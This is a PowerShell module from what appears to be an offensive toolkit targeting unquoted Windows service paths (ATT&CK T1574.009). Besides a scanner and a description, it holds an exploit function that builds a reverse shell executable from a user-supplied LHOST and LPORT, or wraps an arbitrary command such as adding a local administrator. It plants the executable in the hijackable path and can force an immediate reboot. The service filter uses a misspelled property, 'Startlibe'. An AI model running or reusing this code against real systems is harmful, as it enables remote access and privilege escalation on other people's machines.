

function WFL-check-T1574.009 {
	write-host
	Write-Host "[+] IMPORTANT: In order for this to work, 
	the PathName must contain at least one space and the folder must be user writable.
	EX: C:\Program Files\1 Subfolder\2 Subfolder\3 Subfolder\VulnExecutable.exe
	you can then create an executable and write it in the following folder,
	renaming it with using the first part of the folder name before the space
	Ex. C:\Program Files\1 Subfolder\2.exe.
	Obviously C:\Program Files\1 Subfolder\ folder must have write permissions. " -ForegroundColor Yellow  
	write-host
	$services = $null;
	$info = $null;
	try {
		#Write-Host "Fetching the list of services, this may take a while...";
		$services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -imatch " " -and $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" -and ($_.Startlibe -eq "Auto" -or $_.Startlibe -eq "Manual") -and ($_.State -eq "Running" -or $_.State -eq "Stopped") -and ($_.StartName -eq "LocalSystem") };
		if ($($services | Measure-Object).Count -lt 1) {
			Write-Host "";
			Write-Host "[-] No unquoted service paths were found"-ForegroundColor Red ;
			Write-Host "";
		}
		else {
			"`n"
			Write-Host " [+] WARNING: this system is most likely vulnerable to Path Interception by Unquoted Path! " -ForegroundColor Magenta
			$services | Sort-Object -Property ProcessId, Name | Format-List -Property ProcessId, Name, DisplayName, PathName, StartName, Startlibe, State;
		
		}
	
	}
 catch {
		Write-Host $_.Exception.InnerException.Message;
	}
 finally {
		if ($null -ne $services) {
			$services.Dispose();
		}
		if ($null -ne $info) {
			$info.Close();
			$info.Dispose();
		} 
	}
          
             
} function WFL-info-T1574.009 {
            
	Write-Host  
	Write-host "	Adversaries may execute their own malicious payloads
	by hijacking vulnerable file path references. 
	Adversaries can take advantage of paths that lack
	surrounding quotations by placing an executable in
	a higher level directory within the path, 
	so that Windows will choose the adversary's executable to launch.
	Service paths  and shortcut paths may also be 
	vulnerable to path interception if the path has one or more 
	spaces and is not surrounded by quotation marks 
	An adversary can place an executable in a higher level 
	directory of the path, and Windows will resolve that 
	executable instead of the intended executable. 
	For example, if the path in a shortcut is C:\program files\myapp.exe,
	an adversary may create a program at C:\program.exe that will be run
	instead of the intended program.
	This technique can be used for persistence if executables are called 
	on a regular basis, as well as privilege escalation if intercepted 
	executables are started by a higher privileged process."       
	Write-Host 
        

} function WFL-exploit-T1574.009 {
	write-host
	Write-Host " 	[+] IMPORTANT: In order for this to work, 
	the PathName must contain at least one space and the folder must be user writable.
	EX: C:\Program Files\1 Subfolder\2 Subfolder\3 Subfolder\VulnExecutable.exe
	you can then create an executable and write it in the following folder,
	renaming it with using the first part of the folder name before the space
	Ex. C:\Program Files\1 Subfolder\2.exe.
	Obviously C:\Program Files\1 Subfolder\ folder must have write permissions. " -ForegroundColor Yellow  
	write-host
	$exploit_service = Read-Host -Prompt '[*] Insert the path you want to exploit with Unquoted Service Path, including the filename of the executable: Ex. C:\Program Files\1 Subfolder\2.exe '
	write-host
	

	do {
		$confirm = ""
		$confirm = Read-Host -Prompt '[*] Type "agent" if you want to create a new reverse shell or "cmd" if you want to execute a command'
		$array = "agent", "cmd"
		if ($confirm -eq 'agent') {
			Write-Host
			$ipaddress_rev = Read-Host -Prompt '[*] Insert LHOST: '
			$port_rev = Read-Host -Prompt '[*] Insert LPORT: '
			 
			$original_file = '.\lib\rev.ps1'
			$destination_file = '.\lib\revshell.ps1'
					(Get-Content $original_file) | Foreach-Object {
				$_ -replace 'ipaddress_rev', $ipaddress_rev `
					-replace 'port_rev', $port_rev `
			} | Set-Content $destination_file
			  
			Invoke-Exec .\lib\revshell.ps1 .\lib\revshell.exe -noConsole -noError
			Remove-Item .\lib\revshell.ps1
			write-host
		}
		elseif ($confirm -eq 'cmd') {
			Write-Host
			$cmd = Read-Host -Prompt '[*] Insert a command that you want to execute in the victim machine (Ex.net user /add [username] [password] && net localgroup administrators [username] /add): '
					
			 
			$original_file = '.\lib\cmd_master.ps1'
			$destination_file = '.\lib\cmd.ps1'
					(Get-Content $original_file) | Foreach-Object {
				$_ -replace 'command', $cmd `
			} | Set-Content $destination_file
			  
			Invoke-Exec .\lib\cmd.ps1 .\lib\revshell.exe -noConsole -noError
			write-host
		}
	}  until ($confirm -in $array)


	try {
		Copy-Item .\lib\revshell.exe $exploit_service
		Remove-Item .\lib\revshell.exe
		write-host 
	}

	catch { 
		Write-Host "[-] Unable to copy the executable. Please try again." -ForegroundColor red
		Write-Host $_
		Write-Host
		break
	}

	$confirmation = ""
	do {
		$confirmation = Read-Host "[*] To enable the agent or cmd you must restart victim pc, are you sure you want to restart the pc? (y/n)"
		if ($confirmation -eq 'y') {
			shutdown /r /t 0
		}
	} while ($confirmation -ne "n")
}
             




             

             
             

